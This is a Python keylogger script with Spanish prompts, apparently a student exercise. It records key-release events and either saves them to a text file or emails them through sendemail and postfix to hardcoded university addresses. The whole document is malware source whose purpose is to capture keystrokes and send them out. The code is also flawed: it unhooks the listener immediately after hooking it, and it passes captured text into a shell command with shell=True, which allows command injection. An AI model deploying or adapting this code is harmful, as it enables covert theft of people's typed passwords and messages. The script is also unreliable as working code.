import keyboard
import subprocess

registros = []

def callback(event):
    registros.append(event.name)

def output(text):
    with open('output.txt', 'a') as f:
        f.write(text)

def send_email(sender_email, receiver_email, mensaje):
    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m '{mensaje}'"

    subprocess.run(command, shell=True)

def start_postfix():
    subprocess.run(["systemctl", "start", "postfix"])

def stop_postfix():
    subprocess.run(["systemctl", "stop", "postfix"])

def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
        print("Interrumpiendo la ejecución del programa...")
        return
    
    keyboard.on_release(callback)
            
    keyboard.unhook_all()
    
    registro = "\n".join(registros)
      
    if respuesta_email.lower() in ['yes', 'y']:
        sender_email = "janet1204@ciencias.unam.mx"
        receiver_email = "Paola_VB@ciencias.unam.mx"
    
        start_postfix()
        
        send_email(sender_email, receiver_email, registro)
        
        stop_postfix()
        
    if respuesta_guardar.lower() in ['yes', 'y']:
        output(registro)

if __name__ == "__main__":
    main()

